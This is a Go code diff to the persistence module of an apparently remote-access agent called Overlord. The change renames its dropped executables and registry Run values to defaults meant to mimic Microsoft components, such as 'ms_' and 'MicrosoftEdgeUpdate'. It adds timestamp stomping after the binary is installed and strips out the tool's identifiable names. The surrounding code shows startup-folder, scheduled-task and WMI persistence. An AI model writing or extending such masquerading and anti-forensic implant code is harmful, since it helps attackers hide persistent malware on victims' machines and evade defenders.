@@ -16,6 +16,8 @@ import (
 	"syscall"
 
 	"golang.org/x/sys/windows/registry"
+
+	"overlord-client/cmd/agent/evasion"
 )
 
 const (
@@ -23,14 +25,17 @@ const (
 
 	startupFolderRelative = `Microsoft\Windows\Start Menu\Programs\Startup`
 
-	appDataBinaryDir = `Microsoft\DeviceSync`
-
-	defaultExecutablePrefix = "ovd_"
-
-	legacyRegistryValueName = "OverlordAgent"
-	registryValuePrefix     = "OverlordAgent-"
-
 	createNoWindow = 0x08000000
+)
+
+// Injectable via -X ldflag at build time. Defaults mimic legitimate Windows components.
+var (
+	// DefaultExePrefix is the filename prefix for dropped executables.
+	DefaultExePrefix = "ms_"
+	// DefaultRegistryValue is the base name used for Run registry values.
+	DefaultRegistryValue = "MicrosoftEdgeUpdate"
+	// DefaultBinaryDir is the APPDATA-relative directory for the dropped binary.
+	DefaultBinaryDir = `Microsoft\DeviceSync`
 )
 
 func hasCustomName() bool {
@@ -41,7 +46,18 @@ func executablePrefix() string {
 	if hasCustomName() {
 		return DefaultStartupName
 	}
-	return defaultExecutablePrefix
+	return DefaultExePrefix
+}
+
+func registryValueName() string {
+	if hasCustomName() {
+		return DefaultStartupName
+	}
+	return DefaultRegistryValue
+}
+
+func registryValueNamePrefix() string {
+	return registryValueName() + "-"
 }
 
 var hasStartupMethod bool
@@ -89,7 +105,7 @@ func getAppDataTargetPath() (string, error) {
 	if appDataDir == "" {
 		return "", fmt.Errorf("APPDATA environment variable not set")
 	}
-	dir := filepath.Join(appDataDir, appDataBinaryDir)
+	dir := filepath.Join(appDataDir, DefaultBinaryDir)
 	if existing, ok := findExistingBinaryInDir(dir); ok {
 		return existing, nil
 	}
@@ -101,11 +117,7 @@ func getAppDataTargetPath() (string, error) {
 }
 
 func getLegacyTargetPath() (string, bool) {
-	appDataDir := os.Getenv("APPDATA")
-	if appDataDir == "" {
-		return "", false
-	}
-	return filepath.Join(appDataDir, "Overlord", "agent.exe"), true
+	return "", false
 }
 
 func findExistingBinaryInDir(dir string) (string, bool) {
@@ -113,16 +125,13 @@ func findExistingBinaryInDir(dir string) (string, bool) {
 	if err != nil {
 		return "", false
 	}
+	prefix := strings.ToLower(executablePrefix())
 	for _, entry := range entries {
 		if entry.IsDir() {
 			continue
 		}
 		name := strings.ToLower(entry.Name())
-		if hasCustomName() {
-			if name == strings.ToLower(DefaultStartupName+".exe") {
-				return filepath.Join(dir, entry.Name()), true
-			}
-		} else if strings.HasSuffix(name, ".exe") && strings.HasPrefix(name, defaultExecutablePrefix) {
+		if strings.HasSuffix(name, ".exe") && strings.HasPrefix(name, prefix) {
 			return filepath.Join(dir, entry.Name()), true
 		}
 	}
@@ -141,7 +150,7 @@ func generateBinaryName() (string, error) {
 	if _, err := rand.Read(b); err != nil {
 		return "", fmt.Errorf("failed to generate executable name: %w", err)
 	}
-	return defaultExecutablePrefix + hex.EncodeToString(b) + ".exe", nil
+	return DefaultExePrefix + hex.EncodeToString(b) + ".exe", nil
 }
 
 func generateStartupExecutableName() (string, error) {
@@ -149,7 +158,7 @@ func generateStartupExecutableName() (string, error) {
 }
 
 func deriveTaskName(targetPath string) string {
-	prefix := defaultExecutablePrefix
+	prefix := DefaultExePrefix
 	if hasCustomName() {
 		prefix = DefaultStartupName + "_"
 	}
@@ -158,7 +167,7 @@ func deriveTaskName(targetPath string) string {
 }
 
 func deriveWMINames(targetPath string) (filterName, consumerName string) {
-	prefix := defaultExecutablePrefix
+	prefix := DefaultExePrefix
 	if hasCustomName() {
 		prefix = DefaultStartupName + "_"
 	}
@@ -244,11 +253,13 @@ func replaceExecutable(exePath, targetPath string) error {
 	if err := os.Rename(tmpPath, targetPath); err != nil {
 		if removeErr := os.Remove(targetPath); removeErr == nil {
 			if err = os.Rename(tmpPath, targetPath); err == nil {
+				evasion.StompTimestamp(targetPath)
 				return nil
 			}
 		}
 		return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
 	}
+	evasion.StompTimestamp(targetPath)
 	return nil
 }
 
@@ -269,8 +280,7 @@ func uninstall() error {
 	}
 
 	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, startupFolderRelative))
-	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, appDataBinaryDir))
-	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, "Overlord"))
+	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, DefaultBinaryDir))
 
 	if legacyPath, ok := getLegacyTargetPath(); ok {
 		_ = os.Remove(legacyPath)
@@ -292,18 +302,13 @@ func cleanupPrefixedExecutables(dir string) error {
 		return fmt.Errorf("failed to read startup cleanup directory %s: %w", dir, err)
 	}
 
+	prefix := strings.ToLower(executablePrefix())
 	for _, entry := range entries {
 		if entry.IsDir() {
 			continue
 		}
 		name := strings.ToLower(entry.Name())
-		var match bool
-		if hasCustomName() {
-			match = name == strings.ToLower(DefaultStartupName+".exe")
-		} else {
-			match = strings.HasPrefix(name, defaultExecutablePrefix)
-		}
-		if match {
+		if strings.HasPrefix(name, prefix) {
 			if err := os.Remove(filepath.Join(dir, entry.Name())); err != nil && !os.IsNotExist(err) {
 				return fmt.Errorf("failed to remove startup artifact %s: %w", filepath.Join(dir, entry.Name()), err)
 			}
@@ -332,7 +337,7 @@ func cleanupOverlordRunValues(k registry.Key) error {
 		return err
 	}
 	for _, name := range names {
-		if isOverlordRunValueName(name) {
+		if isAgentRunValueName(name) {
 			if err := k.DeleteValue(name); err != nil && err != registry.ErrNotExist {
 				return err
 			}
@@ -341,9 +346,8 @@ func cleanupOverlordRunValues(k registry.Key) error {
 	return nil
 }
 
-func isOverlordRunValueName(name string) bool {
-	if strings.EqualFold(name, legacyRegistryValueName) {
-		return true
-	}
-	return strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix))
+func isAgentRunValueName(name string) bool {
+	lname := strings.ToLower(name)
+	return strings.HasPrefix(lname, strings.ToLower(registryValueNamePrefix())) ||
+		strings.EqualFold(name, registryValueName())
 }
